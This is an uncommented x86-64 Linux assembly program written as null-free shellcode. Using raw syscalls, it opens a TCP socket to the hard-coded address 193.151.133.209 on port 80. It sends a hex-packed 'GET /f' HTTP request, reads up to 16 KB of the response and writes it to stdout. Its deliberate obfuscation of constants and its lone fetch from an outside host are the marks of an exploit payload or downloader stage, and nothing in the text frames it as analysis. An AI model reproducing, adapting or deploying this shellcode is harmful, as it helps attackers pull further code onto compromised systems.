.text
.global _start

_start:
xor %eax, %eax
mov $41, %al
xor %edi, %edi
mov $2, %dil
xor %esi, %esi
mov $1, %sil
xor %edx, %edx
mov $6, %dl
syscall

test %rax, %rax

mov %rax, %rdi


sub $16, %rsp
push $2
pop %ax
#mov $0x2, %ax
mov %ax, (%rsp)
mov $0x1001,%ax
shl $2,%ax
add $0x0ffc,%ax
#mov $0x5000,%ax
mov %ax, 2(%rsp)
mov $0x97C1, %ax
mov %ax, 4(%rsp)
mov $0xD185, %ax
mov %ax, 6(%rsp)
xor %eax, %eax
mov %ax, 8(%rsp)
mov %ax, 10(%rsp)
mov %ax, 12(%rsp)
mov %ax, 14(%rsp)

xor %eax, %eax
mov $42, %al
mov %rsp, %rsi
push $16
pop %rdx
#mov $16, %rdx
syscall

add $16, %rsp

test %rax, %rax


sub $64, %rsp

mov $0x0d0a0d0a0d0a6573, %rax
mov %rax, 56(%rsp)
mov $0x6f6c63203a6e6f69, %rax
mov %rax, 48(%rsp)
mov $0x7463656e6e6f430a, %rax
mov %rax, 40(%rsp)
mov $0x0d3930322e333331, %rax
mov %rax, 32(%rsp)
mov $0x2e3135312e333931, %rax
mov %rax, 24(%rsp)
mov $0x203a74736f480a0d, %rax
mov %rax, 16(%rsp)
mov $0x312e312f50545448, %rax
mov %rax, 8(%rsp)
mov $0x2020662f20544547, %rax
mov %rax, 0(%rsp)

xor %eax, %eax
mov $44, %al
mov %rsp, %rsi
xor %r10,%r10
push $64
pop %rdx
xor %r8,%r8
xor %r9,%r9
syscall

add $64, %rsp

test %rax, %rax

xor %eax, %eax
mov $45, %al
mov %rsp, %rsi
xor %rdx, %rdx
mov $0x101, %rdx
shl $4, %rdx 
shl $2, %rdx 
sub $0x40, %rdx 
xor %r10,%r10
syscall

test %rax, %rax

mov %rax, %rdx
jle _exit

xor %eax, %eax
mov $1, %al
mov $1, %dil
mov %rsp, %rsi
syscall


_exit:
xor %eax, %eax
mov $60, %al
xor %edi, %edi
syscall
